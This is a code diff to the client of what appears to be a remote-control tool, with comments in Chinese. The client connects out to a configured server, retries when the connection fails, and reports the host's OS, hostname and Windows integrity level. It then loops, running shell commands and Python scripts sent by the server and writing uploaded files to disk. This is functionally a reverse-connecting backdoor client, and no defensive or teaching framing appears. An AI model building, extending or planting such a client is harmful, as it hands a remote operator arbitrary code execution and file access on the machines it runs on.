@@ -11,6 +11,9 @@ from client.config import SERVER_ADDR
 from client.server import Server
 from common.util import parse, logger
 
+if os.name == 'nt':
+    from client.win32util import get_integrity_level
+
 
 class Client:
     def __init__(self, address):
@@ -21,6 +24,7 @@ class Client:
 
     def connect(self):
         """ 连接服务端 """
+        logger.info('Connecting to {}'.format(self.address))
         # 连接失败等待5秒后重新连接
         while not self.server.connect(self.address):
             time.sleep(5)
@@ -29,31 +33,34 @@ class Client:
             # 操作系统
             'os': platform.platform(),
             # 主机名
-            'hostname': socket.gethostname()
+            'hostname': socket.gethostname(),
+            # 进程权限
+            'integrity': get_integrity_level() if os.name == 'nt' else 'N/A'
         }
         self.server.send_result(1, json.dumps(info))
+        logger.info('Connected')
 
     def wait_for_cmd(self):
         """ 等待命令 """
         while True:
             try:
                 # 从服务端接收命令
-                head, body = self.server.recv()
                 try:
-                    # 执行命令
-                    if head['type'] == 'command':
-                        result = self.exec_cmd(body.decode())
-                    # 执行python脚本
-                    elif head['type'] == 'script':
-                        result = Command.pyexec(body.decode(), json.loads(head['args']))
-                    # 保存文件
-                    elif head['type'] == 'file':
-                        with open(head['filename'], 'wb') as file:
-                            file.write(body)
-                        result = 1, 'File uploaded to: {}'.format(os.path.abspath(head['filename']))
+                    head = self.server.recv_head()
+                    type = head['type']
+                    if type == 'file':
+                        filename = head['filename']
+                        with open(filename, 'ab') as f:
+                            f.truncate(0)
+                            self.server.recv_body(head, f=f)
+                            result = 1, '\nFile uploaded to: {}'.format(os.path.abspath(filename))
+                    elif type == 'command':
+                        result = self.exec_cmd(self.server.recv_body(head))
+                    elif type == 'script':
+                        result = Command.pyexec(self.server.recv_body(head), json.loads(head['args']))
                     else:
+                        self.server.recv_body(head)
                         result = None
-                    # 发送执行结果
                     if result:
                         self.server.send_result(*result)
                 except Exception as e:
@@ -61,9 +68,11 @@ class Client:
                 # 发送当前工作目录的路径
                 self.server.send_result(1, os.getcwd())
             except SystemExit:
+                logger.error('Server closed this connection')
                 break
             # 连接断开
             except socket.error:
+                logger.error('Connection closed')
                 # 关闭套接字
                 self.server.close()
                 # 重新创建套接字
